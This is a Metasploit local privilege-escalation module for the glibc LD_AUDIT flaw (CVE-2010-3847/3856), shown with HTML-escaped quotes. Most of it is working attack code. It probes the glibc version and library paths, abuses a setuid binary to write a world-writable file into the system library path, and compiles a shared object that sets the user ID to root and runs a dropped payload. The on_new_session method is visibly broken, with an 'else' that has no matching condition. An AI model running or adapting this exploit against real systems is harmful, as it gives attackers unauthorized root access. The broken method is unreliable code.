# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/exploit/local/linux&#039;
require &#039;msf/core/exploit/exe&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Local::Linux

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;glibc LD_AUDIT Arbitrary DSO Load Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module attempts to gain root privileges on Linux systems by abusing
        a vulnerability in the GNU C Library (glibc) dynamic linker.

        glibc ld.so in versions before 2.11.3, and 2.12.x before 2.12.2 does not
        properly restrict use of the LD_AUDIT environment variable when loading
        setuid executables. This allows loading arbitrary shared objects from
        the trusted library search path with the privileges of the suid user.

        This module uses LD_AUDIT to load the libpcprofile.so shared object,
        distributed with some versions of glibc, and leverages arbitrary file
        creation functionality in the library constructor to write a root-owned
        world-writable file to a system trusted search path (usually /lib).
        The file is then overwritten with a shared object then loaded with
        LD_AUDIT resulting in arbitrary code execution.

        This module has been tested successfully on glibc version 2.11.1 on
        Ubuntu 10.04 x86_64 and version 2.7 on Debian 5.0.4 i386.

        RHEL 5 is reportedly affected, but untested. Some glibc distributions
        do not contain the libpcprofile.so library required for successful
        exploitation.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Tavis Ormandy&#039;, # Discovery and exploit
          &#039;zx2c4&#039;,         # "I Can&#039;t Read and I Won&#039;t Race You Either" exploit
          &#039;Marco Ivaldi&#039;,  # raptor_ldaudit and raptor_ldaudit2 exploits
          &#039;Todor Donev&#039;,   # libmemusage.so exploit
          &#039;Brendan Coles&#039;  # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 18 2010&#039;,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ],
          [ &#039;Linux x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Linux x64&#039;, { &#039;Arch&#039; => ARCH_X64 } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2010-3847&#039; ],
          [ &#039;CVE&#039;, &#039;2010-3856&#039; ],
          [ &#039;BID&#039;, &#039;44154&#039; ],
          [ &#039;BID&#039;, &#039;44347&#039; ],
          [ &#039;EDB&#039;, &#039;15274&#039; ],
          [ &#039;EDB&#039;, &#039;15304&#039; ],
          [ &#039;EDB&#039;, &#039;18105&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2010/Oct/257&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2010/Oct/344&#039; ],
          [ &#039;URL&#039;, &#039;https://www.ubuntu.com/usn/usn-1009-1&#039; ],
          [ &#039;URL&#039;, &#039;https://security-tracker.debian.org/tracker/CVE-2010-3847&#039; ],
          [ &#039;URL&#039;, &#039;https://security-tracker.debian.org/tracker/CVE-2010-3856&#039; ],
          [ &#039;URL&#039;, &#039;https://access.redhat.com/security/cve/CVE-2010-3847&#039; ],
          [ &#039;URL&#039;, &#039;https://access.redhat.com/security/cve/CVE-2010-3856&#039; ]
        ]
    ))
    register_options(
      [
        OptString.new(&#039;SUID_EXECUTABLE&#039;, [ true, &#039;Path to a SUID executable&#039;, &#039;/bin/ping&#039; ]),
        OptString.new(&#039;WritableDir&#039;,     [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
      ])
  end

  def base_dir
    datastore[&#039;WritableDir&#039;]
  end

  def suid_exe_path
    datastore[&#039;SUID_EXECUTABLE&#039;]
  end

  def check
    glibc_banner = cmd_exec &#039;ldd --version&#039;
    glibc_version = Gem::Version.new glibc_banner.scan(/^ldd\s+\(.*\)\s+([\d\.]+)/).flatten.first
    if glibc_version.to_s.eql? &#039;&#039;
      vprint_error &#039;Could not determine the GNU C library version&#039;
      return CheckCode::Safe
    elsif glibc_version >= Gem::Version.new(&#039;2.12.2&#039;) ||
          (glibc_version >= Gem::Version.new(&#039;2.11.3&#039;) && glibc_version < Gem::Version.new(&#039;2.12&#039;))
      vprint_error "GNU C Library version #{glibc_version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "GNU C Library version #{glibc_version} is vulnerable"

    lib = &#039;libpcprofile.so&#039;
    @lib_dir = nil
    vprint_status "Checking for #{lib} in system search paths"
    search_paths = cmd_exec "env -i LD_PRELOAD=#{rand_text_alpha rand(10..15)} LD_DEBUG=libs env 2>&1 | grep &#039;search path=&#039;"
    search_paths.split(&#039;path=&#039;)[1..-1].join.split(&#039;:&#039;).each do |path|
      lib_dir = path.to_s.strip
      next if lib_dir.eql? &#039;&#039;
      libs = cmd_exec "ls &#039;#{lib_dir}&#039;"
      if libs.include? lib
        @lib_dir = lib_dir
        break
      end
    end
    if @lib_dir.nil?
      vprint_error "Could not find #{lib}"
      return CheckCode::Safe
    end
    vprint_good "Found #{lib} in #{@lib_dir}"

    unless setuid? suid_exe_path
      vprint_error "#{suid_exe_path} is not setuid"
      return CheckCode::Detected
    end
    vprint_good "#{suid_exe_path} is setuid"

    CheckCode::Appears
  end

  def upload_and_chmodx(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    cmd_exec "chmod +x &#039;#{path}&#039;"
    register_file_for_cleanup path
  end

  def on_new_session(client)
    # remove root owned shared object from system load path
      client.core.use &#039;stdapi&#039; unless client.ext.aliases.include? &#039;stdapi&#039;
      client.fs.file.rm @so_path
    else
      client.shell_command_token "rm #{@so_path}"
    end
  end

  def exploit
    check_status = check

    if check_status == CheckCode::Appears
      print_good &#039;The target appears to be vulnerable&#039;
    elsif check_status == CheckCode::Detected
      fail_with Failure::BadConfig, "#{suid_exe_path} is not suid"
    else
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end

    payload_name = ".#{rand_text_alphanumeric rand(5..10)}"
    payload_path = "#{base_dir}/#{payload_name}"

    # Set target
    uname = cmd_exec &#039;uname -m&#039;
    vprint_status "System architecture is #{uname}"
    if target.name.eql? &#039;Automatic&#039;
      case uname
      when &#039;x86_64&#039;
        my_target = targets[2]
      when /x86/, /i\d86/
        my_target = targets[1]
      else
        fail_with Failure::NoTarget, &#039;Unable to automatically select a target&#039;
      end
    else
      my_target = target
    end
    print_status "Using target: #{my_target.name}"

    cpu = nil
    case my_target[&#039;Arch&#039;]
    when ARCH_X86
      cpu = Metasm::Ia32.new
    when ARCH_X64
      cpu = Metasm::X86_64.new
    else
      fail_with Failure::NoTarget, &#039;Target is not compatible&#039;
    end

    # Compile shared object
    so_stub = %|
      extern int setuid(int);
      extern int setgid(int);
      extern int system(const char *__s);

      void init(void) __attribute__((constructor));

      void __attribute__((constructor)) init() {
        setuid(0);
        setgid(0);
        system("#{payload_path}");
      }
    |

    begin
      so = Metasm::ELF.compile_c(cpu, so_stub).encode_string(:lib)
    rescue
      print_error "Metasm encoding failed: #{$ERROR_INFO}"
      elog "Metasm encoding failed: #{$ERROR_INFO.class} : #{$ERROR_INFO}"
      elog "Call stack:\n#{$ERROR_INFO.backtrace.join "\n"}"
      fail_with Failure::Unknown, &#039;Metasm encoding failed&#039;
    end

    # Upload shared object
    so_name = ".#{rand_text_alphanumeric rand(5..10)}"
    so_path = "#{base_dir}/#{so_name}"
    upload_and_chmodx so_path, so

    # Upload exploit
    @so_path = "#{@lib_dir}/#{so_name}.so"
    exp = %(
      umask 0
      LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="#{@so_path}" #{suid_exe_path} 2>/dev/null
      umask 0022
      cat #{so_path} > #{@so_path}
      LD_AUDIT="#{so_name}.so" #{suid_exe_path}
      echo > #{@so_path}
    )
    exp_name = ".#{rand_text_alphanumeric rand(5..10)}"
    exp_path = "#{base_dir}/#{exp_name}"
    upload_and_chmodx exp_path, exp

    # Upload payload
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit
    print_status &#039;Launching exploit...&#039;
    # The echo at the end of the command is required
    # else the original session may die
    output = cmd_exec "#{exp_path}& echo "
    output.each_line { |line| vprint_status line.chomp }
  end
end

